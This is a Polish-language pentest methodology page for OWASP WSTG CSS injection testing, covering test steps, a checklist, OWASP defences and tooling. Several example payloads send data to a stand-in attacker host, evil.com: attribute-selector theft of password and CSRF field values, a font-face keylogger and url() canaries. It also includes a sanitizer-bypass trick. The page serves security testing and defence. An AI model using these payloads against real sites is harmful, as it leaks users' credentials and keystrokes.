# WSTG-CLNT-05 — Testing for CSS Injection

## Cel

Wykrycie CSS Injection: user-controlled CSS w `style` attribute lub stylesheet → data exfiltration via attribute selectors, keylogging via font-face unicode-range, UI redress, legacy `expression()` JavaScript execution (IE).

> **Test mostly manual**: CSS Injection wymaga PoC z attribute selectors + monitorowanie callbacks. Nuclei nie ma dedykowanego template.

## Standard pentesterski — jak to robi się wzorowo

### Metodologia (5 kroków)

1. **Identify CSS injection points**: user input w `style` attribute, custom themes, CSS variables.
2. **Test inline style**: `'); color: red; background-image: url(//evil.com/?canary)` w `style="..."`.
3. **Attribute selector exfil**: `input[name="password"][value^="a"]{background:url(evil.com/a)}` — czyta values bajt po bajcie.
4. **font-face keylogging**: `@font-face { unicode-range: U+0061; src: url(evil.com/a); }` — wykrywa wciśnięty klawisz.
5. **Legacy IE check**: `expression(alert(1))` — w bardzo starych IE działa.

### Co MUSI być sprawdzone (8 punktów)

- [ ] User input w `style` attribute reflectowany?
- [ ] Custom theme uploads (CMS, theming)
- [ ] CSS variables (`--user-color`)
- [ ] iframe content z user CSS
- [ ] Email rendering (HTML email z CSS)
- [ ] PDF generation (some libraries akceptują CSS)
- [ ] Mobile webview rendering
- [ ] CSP `style-src` policy

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Securing_Cascading_Style_Sheets_Cheat_Sheet.md

### CSS Injection — co jest możliwe

- **Data exfiltration via CSS selectors**: `input[value^="a"] { background: url(https://evil.com/a) }` — odczyt wartości pól
- **Keylogging via CSS**: font-face + unicode-range — wykrywanie wciśniętych klawiszy
- **UI redressing**: zmiana wyglądu strony, ukrywanie/wyświetlanie elementów
- **JavaScript execution** (legacy): `expression()` (IE), `-moz-binding` (stary Firefox)

### Niebezpieczne konstrukcje CSS

- `expression()` — wykonuje JavaScript (tylko IE, ale testuj)
- `url()` — ładuje zewnętrzne zasoby (exfiltracja danych)
- `@import` — ładuje zewnętrzny CSS (injection zewnętrznego arkusza)
- `behavior:` — ładuje HTC files (IE)
- `-moz-binding:` — ładuje XBL (stary Firefox)

### Obrona

- **NIE wstawiaj user input** do atrybutu `style` ani do arkuszy CSS
- **CSP `style-src`**: ogranicz źródła CSS — `style-src 'self'` — blokuj inline styles jeśli możliwe
- **Sanityzuj CSS**: usuń `expression()`, `url()`, `@import`, `behavior:`, `-moz-binding:`
- **Allowlist właściwości CSS**: pozwól tylko na bezpieczne (color, font-size, margin) — denylist jest niewystarczający
- **Używaj CSS classes** zamiast inline styles — łatwe do kontrolowania

### CSS Exfiltration — jak działa

- Atakujący wstrzykuje CSS selector: `input[name="csrf"][value^="abc"] { background: url(evil.com/abc) }`
- Przeglądarka ładuje URL gdy selector pasuje → atakujący dowiaduje się o wartości pola
- Iteracja po znakach: `value^="a"`, `value^="ab"`, `value^="abc"` → pełna wartość
- Obrona: nie pozwalaj na user-controlled CSS, używaj CSP

## Pentesterskie deep dive

### Mniej znane techniki

- **CSS Injection PoC tooling**: https://github.com/d0nutptr/sic — automated CSS exfil za pomocą attribute selectors.
- **CSS keylogger**: research z 2018 — keylogger via CSS via `:focus` pseudo-class.
- **HTTP/2 push for CSS exfil**: faster exfil bo wszystkie URL prefetched w jednym HTTP/2 connection.
- **Email CSS injection**: HTML email akceptuje większość CSS — atakujący wstrzykuje exfil styles → tracking pixels per recipient pattern.
- **Sanitizer bypass via comment injection**: `/* */ expression(alert(1)) /* */` w niektórych sanitizers.

### Common pitfalls

- **CSP allows inline styles**: `style-src 'unsafe-inline'` umożliwia większość CSS injection ataków.
- **Theme upload bez sanityzacji**: CMS pozwala na upload custom CSS = pełna CSS injection.

### Świeżynki z research

- **PortSwigger CSS Injection research**: https://portswigger.net/research
- **HackTricks CSS Injection**: https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection
- **sic (CSS Injection Tool)**: https://github.com/d0nutptr/sic

## Rozszerzenia Burp Suite

Brak dedykowanych - test manual + custom Burp Macro.

## Źródła

- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection
- OWASP CSS Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html
- HackTricks CSS Injection: https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection

### Wskazówki ASVS

| ID | Sekcja | Wymaganie |
|---|---|---|
| V14.4.3 | Configuration (L1) | CSP set deny by default. |
| V5.3.3 | Output Encoding (L1) | Context-aware output encoding. |
